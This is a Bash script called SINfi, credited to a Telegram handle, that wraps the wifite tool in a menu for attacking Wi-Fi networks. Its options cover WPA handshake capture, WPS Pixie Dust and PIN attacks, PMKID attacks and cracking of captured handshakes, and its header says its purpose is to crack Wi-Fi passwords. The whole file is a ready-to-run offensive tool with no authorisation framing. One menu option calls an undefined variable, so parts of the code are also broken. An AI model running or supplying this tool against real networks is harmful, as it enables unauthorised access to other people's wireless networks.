#!/usr/bin/env bash

#============================================================================================================
#                         SINfi for Linux
#
#                             Welcome
#                         SINfi By Scroll
#              Tested On Debian Based Operating System
#                      Telegram : @itsScroll
# Information : This program is used to attack WIFI to a numerous types of attacks and crack their passowrds
#============================================================================================================


#Colors used
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
BlueF='\e[1;34m'


#Default Variables
Version='1.7'
Codename='SINfi'
xterm='xterm -hold -fa monaco -fs 10 -geometry 115x40 -bg black -e wifite'


trap ctrl_c INT
ctrl_c() {
clear
echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit ..."
sleep 1
echo ""
echo -e $yellow"[*] Thank You For Using SINfi  =)."
echo ""
exit
}

#Checking if you are using root!
if [[ $EUID -ne 0 ]]; then
	echo "ERROR! Run this script with root user!"
	exit 1
fi

if [ -z "${DISPLAY:-}" ]; then
    echo -e "\e[1;31mThe script should be executed inside a X (graphical) session."$transparent""
    exit 1
fi
resize -s 50 84 > /dev/null

#Checking Dependencies
###############################################
clear
echo -e $red ""
echo "             80G08        "
echo "                8G#G@8  "
echo "                  8##0  "
echo "                   0##G8    "
echo "                     ####08 "
echo "                      8#####8   "
echo "                        G#####8   "
echo "                         8G#####8   "
echo "      #8#########0         #######8   "
echo "          8#######0          0#88#####    "
echo "            8G####8         8 8#8@@8###   "
echo "               8###        G8   8@G######   "
echo "                8##88       8     8######8    "
echo "                  G##088          80G##G080   "
echo "                    88000000008880#      000    "
echo "                          9               0 "
echo -e $okegreen"";
echo -e $okegreen"-------------------------------------------------------------------------";
echo -e $cyan"    Script by           $white":" $red Scroll"
echo -e $cyan"    Version             $white":" $red $Version  "
echo -e $cyan"    Codename            $white":" $red $Codename "
echo -e $cyan"    Add me on Telegram  $white":" $red @itsScroll "
echo -e $okegreen"-------------------------------------------------------------------------";
echo -e $okegreen"";

if [ $(id -u) != "0" ]; then

      echo [!]::[Check Dependencies] ;
      sleep 2
      echo [✔]::[Check User]: $USER ;
      sleep 1
      echo [x]::[not root]: you need to be [root] to run this script.;
      echo ""
   	  sleep 1
	  exit


else

   echo [!]::[Check Dependencies]: ;
   sleep 1
   echo [✔]::[Check User]: $USER ;
fi

#Checking if wifite exists or else installing it
      which wifite > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
      echo [✔]::[Wifite]: installation found!;
else

   echo [x]::[warning]:this script require Wifite ;
   echo ""
   echo [!]::[please wait]: please install .... ;
   apt-get update
   apt-get install wifite
   echo ""
   sleep 2
   exit
fi
sleep 2
#Checking if xterm exists or else installing it
      which xterm > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
      echo [✔]::[xterm]: installation found!;
else

   echo [x]::[warning]:this script require xterm ;
   echo ""
   echo [!]::[please wait]: please install .... ;
   apt-get update
   apt-get install xterm
   echo ""
   sleep 2
   exit
fi
sleep 2

###################################################
# Function Menu
#####################################################
function menu() {
clear
echo -e $red ""
echo "             80G08        "
echo "                8G#G@8  "
echo "                  8##0  "
echo "                   0##G8    "
echo "                     ####08 "
echo "                      8#####8   "
echo "                        G#####8   "
echo "                         8G#####8   "
echo "      #8#########0         #######8   "
echo "          8#######0          0#88#####    "
echo "            8G####8         8 8#8@@8###   "
echo "               8###        G8   8@G######   "
echo "                8##88       8     8######8    "
echo "                  G##088          80G##G080   "
echo "                    88000000008880#      000    "
echo "                          9               0 "
echo -e $okegreen"";
echo -e $okegreen"-------------------------------------------------------------------------";
echo -e $cyan"    Script by           $white":" $red Scroll"
echo -e $cyan"    Version             $white":" $red $Version  "
echo -e $cyan"    Codename            $white":" $red $Codename "
echo -e $cyan"    Add me on Telegram  $white":" $red @itsScroll "
echo -e $okegreen"-------------------------------------------------------------------------";
echo -e $okegreen"";
		echo -e $white " "
		echo -e $white"	[$okegreen"1"$white]$cyan  DEFAULT HANDSHAKE$red (ALL BRAND) "
        echo -e $white"	[$okegreen"2"$white]$cyan  CHECK FOR NEW HANDSHAKE $red(Ignores existing) "
		echo -e $white"	[$okegreen"3"$white]$cyan  ATTACK WITH WPS ATTACKS $red(Pixie Dust, Null PIN , WPS PIN) "
        echo -e $white"	[$okegreen"4"$white]$cyan  ATTACK ONLY WITH$red Pixie Dust$cyan ATTACK "
		echo -e $white"	[$okegreen"5"$white]$cyan  ATTACK ONLY WITH$red Null PIN / WPS PIN$cyan ATTACKS "
        echo -e $white"	[$okegreen"6"$white]$cyan  ATTACK WITH$red PMKid$cyan ATTACKS "
        echo -e $white"	[$okegreen"7"$white]$cyan  DISPLAY EVERY CRACKED ACCESS POINT "
		echo -e $white"	[$okegreen"8"$white]$cyan  CRACK EVERY HANDSHAKE IN DEFAULT DIRECTORY "
		echo -e $white"	[$okegreen"9"$white]$cyan  EXIT  "
		echo -e " "
		echo -n -e $red'  \033[4mSIN@WifiAttack-v1.7:\033[0m '; tput sgr0 #Insert your option
		read SINfi
		if test $SINfi == '1'
            then
        $xterm --allbands --showb --showm --wpadt 10 --no-wps --no-pixie --no-nullpin --no-pmkid --daemon

		elif test $SINfi == '2'
 			then
        $xterm --allbands --new-hs --showb --showm --wpadt 10 --no-wps --no-pixie --no-nullpin --no-pmkid --daemon

		elif test $SINfi == '3'
			then
        $xterm --allbands --showb --showm --wpadt 10 --wps-only --daemon

		elif test $SINfi == '4'
			then
        $xterm --allbands --showb --showm --wpadt 10 --wps-only --pixie --daemon

		elif test $SINfi == '5'
			then
		$xterm --allbands --showb --showm --wpadt 10 --wps-only --no-pixie --daemon

        elif test $SINfi == '6'
            then
        $xterm --allbands --showb --showm --wpadt 10 --pmkid --daemon

		elif test $SINfi == '7'
			then
		$xterm --cracked

		elif test $SINfi == '8'
 			then
 		$term --crack

    elif test $SINfi == '9'
      then
        clear
				echo -e $yellow"[*] Thank You For Using SINfi  =)."
				sleep 2
				clear
        exit

 		else
			echo -e "  Incorrect Number"
			fi
			echo -n -e "  Do you want exit? ( Yes / No ) :"
			read back
			if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
					then
					clear
					echo -e $yellow"[*] Thank You For Using SINfi  =)."
					sleep 3
					clear
					exit
			elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
					then
					menu
  fi

}

####################################################
# BANNER
####################################################
clear
echo -e $red ""
echo "             80G08        "
echo "                8G#G@8  "
echo "                  8##0  "
echo "                   0##G8    "
echo "                     ####08 "
echo "                      8#####8   "
echo "                        G#####8   "
echo "                         8G#####8   "
echo "      #8#########0         #######8   "
echo "          8#######0          0#88#####    "
echo "            8G####8         8 8#8@@8###   "
echo "               8###        G8   8@G######   "
echo "                8##88       8     8######8    "
echo "                  G##088          80G##G080   "
echo "                    88000000008880#      000    "
echo "                          9               0 "
echo -e $okegreen"";
echo -e $okegreen"-------------------------------------------------------------------------";
echo -e $cyan"    Script by           $white":" $red Scroll"
echo -e $cyan"    Version             $white":" $red $Version  "
echo -e $cyan"    Codename            $white":" $red $Codename "
echo -e $cyan"    Add me on Telegram  $white":" $red @itsScroll "
echo -e $okegreen"-------------------------------------------------------------------------";
echo -e $okegreen"";
		echo -e $white " "
		echo -e $white"	[$okegreen"1"$white]$cyan  DEFAULT HANDSHAKE$red (ALL BRAND) "
        echo -e $white"	[$okegreen"2"$white]$cyan  CHECK FOR NEW HANDSHAKE $red(Ignores existing) "
		echo -e $white"	[$okegreen"3"$white]$cyan  ATTACK WITH WPS ATTACKS $red(Pixie Dust, Null PIN , WPS PIN) "
        echo -e $white"	[$okegreen"4"$white]$cyan  ATTACK ONLY WITH$red Pixie Dust$cyan ATTACK "
		echo -e $white"	[$okegreen"5"$white]$cyan  ATTACK ONLY WITH$red Null PIN / WPS PIN$cyan ATTACKS "
        echo -e $white"	[$okegreen"6"$white]$cyan  ATTACK WITH$red PMKid$cyan ATTACKS "
        echo -e $white"	[$okegreen"7"$white]$cyan  DISPLAY EVERY CRACKED ACCESS POINT "
		echo -e $white"	[$okegreen"8"$white]$cyan  CRACK EVERY HANDSHAKE IN DEFAULT DIRECTORY "
		echo -e $white"	[$okegreen"9"$white]$cyan  EXIT  "
echo -e " "
		echo -n -e $red'  \033[4mSIN@WifiAttack-v1.7:\033[0m '; tput sgr0 #Insert your option
		read SINfi
		if test $SINfi == '1'
            then
        $xterm --allbands --showb --showm --wpadt 10 --no-wps --no-pixie --no-nullpin --no-pmkid --daemon

		elif test $SINfi == '2'
 			then
        $xterm --allbands --new-hs --showb --showm --wpadt 10 --no-wps --no-pixie --no-nullpin --no-pmkid --daemon

		elif test $SINfi == '3'
			then
        $xterm --allbands --showb --showm --wpadt 10 --wps-only --daemon

		elif test $SINfi == '4'
			then
        $xterm --allbands --showb --showm --wpadt 10 --wps-only --pixie --daemon

		elif test $SINfi == '5'
			then
		$xterm --allbands --showb --showm --wpadt 10 --wps-only --no-pixie --daemon

        elif test $SINfi == '6'
            then
        $xterm --allbands --showb --showm --wpadt 10 --pmkid --daemon

		elif test $SINfi == '7'
			then
		$xterm --cracked

		elif test $SINfi == '8'
 			then
 		$term --crack

    elif test $SINfi == '9'
      then
        clear
				echo -e $yellow"[*] Thank You For Using SINfi  =)."
				sleep 2
				clear
        exit

 		else
			echo -e "  Incorrect Number"
			fi
			echo -n -e "  Do you want exit? ( Yes / No ) :"
			read back
			if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
					then
					clear
					echo -e $yellow"[*] Thank You For Using SINfi  =)."
					sleep 3
					clear
					exit
			elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
					then
					menu
fi

